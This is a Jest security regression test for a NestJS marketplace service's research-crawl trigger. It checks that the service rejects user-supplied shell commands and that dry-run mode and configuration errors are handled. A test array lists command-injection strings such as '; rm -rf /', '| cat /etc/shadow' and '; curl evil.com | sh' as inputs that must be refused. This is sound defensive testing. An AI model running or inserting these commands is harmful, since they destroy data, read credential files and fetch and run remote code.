import { BadRequestException } from '@nestjs/common';
import { Test, TestingModule } from '@nestjs/testing';
import { spawn } from 'node:child_process';
import { MarketplaceService } from './marketplace.service';

// Mock node:child_process spawn
jest.mock('node:child_process', () => ({
  spawn: jest.fn(),
}));

describe('MarketplaceService - triggerResearchCrawl security regression', () => {
  let service: MarketplaceService;
  let mockSpawn: jest.MockedFunction<typeof spawn>;
  let mockChild: any;

  beforeEach(async () => {
    // Reset environment
    process.env.CRAWL4AI_PIPELINE_COMMAND = 'python -m crawl4ai --url https://example.com';
    process.env.MARKETPLACE_DATABASE_URL = 'postgres://test:test@localhost:5432/test';
    process.env.DATABASE_URL = 'postgres://test:test@localhost:5432/test';

    mockChild = {
      stdout: { on: jest.fn() },
      stderr: { on: jest.fn() },
      on: jest.fn(),
      pid: 12345,
    };

    mockSpawn = spawn as jest.MockedFunction<typeof spawn>;
    mockSpawn.mockReturnValue(mockChild as any);

    const module: TestingModule = await Test.createTestingModule({
      providers: [MarketplaceService],
    }).compile();

    service = module.get<MarketplaceService>(MarketplaceService);

    // Bypass ensureInitialized and directly set internal state
    (service as any).dbEnabled = true;
    (service as any).dbClient = {}; // Just needs to be truthy
    (service as any).initialized = true;

    // Mock upsertCrawlRun to avoid DB calls
    (service as any).upsertCrawlRun = jest.fn().mockResolvedValue(undefined);
  });

  afterEach(() => {
    jest.clearAllMocks();
    delete process.env.CRAWL4AI_PIPELINE_COMMAND;
    delete process.env.MARKETPLACE_DATABASE_URL;
    delete process.env.DATABASE_URL;
  });

  describe('input.command rejection', () => {
    it('rejects non-empty input.command with BadRequestException', async () => {
      await expect(service.triggerResearchCrawl({ command: 'echo hello' })).rejects.toThrow(
        BadRequestException
      );

      await expect(service.triggerResearchCrawl({ command: 'echo hello' })).rejects.toThrow(
        'Dynamically specifying shell commands is disabled for security reasons.'
      );

      // Verify spawn was never called
      expect(mockSpawn).not.toHaveBeenCalled();
    });

    it('rejects input.command with shell metacharacters', async () => {
      const maliciousCommands = [
        '; rm -rf /',
        '&& reboot',
        '$(cat /etc/passwd)',
        '`id`',
        '| cat /etc/shadow',
        '; curl evil.com | sh',
        '; echo hacked',
        '$({cat,/etc/passwd})',
        '; cat /etc/passwd;',
        'echo test; cat /etc/passwd',
        'echo test && cat /etc/passwd',
        'echo test || cat /etc/passwd',
        '`reboot`',
        '$(reboot)',
        'echo `id`',
        'echo $(id)',
      ];

      for (const cmd of maliciousCommands) {
        await expect(service.triggerResearchCrawl({ command: cmd })).rejects.toThrow(
          BadRequestException
        );
        expect(mockSpawn).not.toHaveBeenCalled();
      }
    });

    it('rejects whitespace-only command (truthy)', async () => {
      await expect(service.triggerResearchCrawl({ command: '   ' })).rejects.toThrow(
        BadRequestException
      );
      expect(mockSpawn).not.toHaveBeenCalled();
    });

    it('rejects empty string command (falsy, falls through to env)', async () => {
      const result = await service.triggerResearchCrawl({ command: '' });
      expect(result.accepted).toBe(true);
      expect(result.status).toBe('running');
      expect(result.command).toBe('python -m crawl4ai --url https://example.com');
      expect(mockSpawn).toHaveBeenCalledTimes(1);
    });
  });

  describe('dryRun mode', () => {
    it('does not spawn when dryRun: true', async () => {
      const result = await service.triggerResearchCrawl({ dryRun: true });

      expect(result.accepted).toBe(true);
      expect(result.status).toBe('dry_run');
      expect(result.message).toBe('Dry run recorded; crawl command not executed.');
      expect(result.command).toBeDefined();
      expect(mockSpawn).not.toHaveBeenCalled();
    });

    it('dryRun returns the configured command', async () => {
      const result = await service.triggerResearchCrawl({ dryRun: true });

      expect(result.command).toBe('python -m crawl4ai --url https://example.com');
    });

    it('dryRun does not execute even with malicious env command', async () => {
      process.env.CRAWL4AI_PIPELINE_COMMAND = 'python -m crawl4ai; rm -rf /';

      const result = await service.triggerResearchCrawl({ dryRun: true });

      expect(result.accepted).toBe(true);
      expect(result.status).toBe('dry_run');
      expect(mockSpawn).not.toHaveBeenCalled();
    });
  });

  describe('normal execution path', () => {
    it('spawns the configured pipeline command when not dryRun', async () => {
      const result = await service.triggerResearchCrawl({ dryRun: false });

      expect(result.accepted).toBe(true);
      expect(result.status).toBe('running');
      expect(result.command).toBe('python -m crawl4ai --url https://example.com');
      expect(mockSpawn).toHaveBeenCalledTimes(1);
      expect(mockSpawn).toHaveBeenCalledWith(
        'sh',
        ['-lc', 'python -m crawl4ai --url https://example.com'],
        { stdio: ['ignore', 'pipe', 'pipe'] }
      );
    });

    it('executes without dryRun flag (defaults to false)', async () => {
      const result = await service.triggerResearchCrawl({});

      expect(result.accepted).toBe(true);
      expect(result.status).toBe('running');
      expect(mockSpawn).toHaveBeenCalledTimes(1);
    });

    it('sanitizes the command from env before execution', async () => {
      process.env.CRAWL4AI_PIPELINE_COMMAND = '  python -m crawl4ai --url https://example.com  ';

      await service.triggerResearchCrawl({ dryRun: false });

      expect(mockSpawn).toHaveBeenCalledWith(
        'sh',
        ['-lc', 'python -m crawl4ai --url https://example.com'],
        { stdio: ['ignore', 'pipe', 'pipe'] }
      );
    });
  });

  describe('error handling', () => {
    it('fails when CRAWL4AI_PIPELINE_COMMAND is not configured', async () => {
      delete process.env.CRAWL4AI_PIPELINE_COMMAND;

      const result = await service.triggerResearchCrawl({ dryRun: false });

      expect(result.accepted).toBe(false);
      expect(result.status).toBe('failed');
      expect(result.error).toBe('CRAWL4AI_PIPELINE_COMMAND is not configured');
      expect(mockSpawn).not.toHaveBeenCalled();
    });

    it('fails when CRAWL4AI_PIPELINE_COMMAND is empty string', async () => {
      process.env.CRAWL4AI_PIPELINE_COMMAND = '';

      const result = await service.triggerResearchCrawl({ dryRun: false });

      expect(result.accepted).toBe(false);
      expect(result.status).toBe('failed');
      expect(mockSpawn).not.toHaveBeenCalled();
    });

    it('fails when database is unavailable', async () => {
      // Create a new service instance without DB
      const module: TestingModule = await Test.createTestingModule({
        providers: [MarketplaceService],
      }).compile();

      const newService = module.get<MarketplaceService>(MarketplaceService);
      // Don't initialize - DB will be unavailable
      (newService as any).dbEnabled = false;

      await expect(newService.triggerResearchCrawl({ dryRun: false })).rejects.toThrow(
        BadRequestException
      );
      expect(mockSpawn).not.toHaveBeenCalled();
    });
  });

  describe('run tracking', () => {
    it('returns a valid runId', async () => {
      const result = await service.triggerResearchCrawl({ dryRun: true });

      expect(result.runId).toMatch(/^crawl-\d+-[a-f0-9]{8}$/);
    });

    it('generates unique runIds', async () => {
      const results = await Promise.all([
        service.triggerResearchCrawl({ dryRun: true }),
        service.triggerResearchCrawl({ dryRun: true }),
        service.triggerResearchCrawl({ dryRun: true }),
      ]);

      const runIds = results.map((r) => r.runId);
      expect(new Set(runIds).size).toBe(3);
    });
  });
});
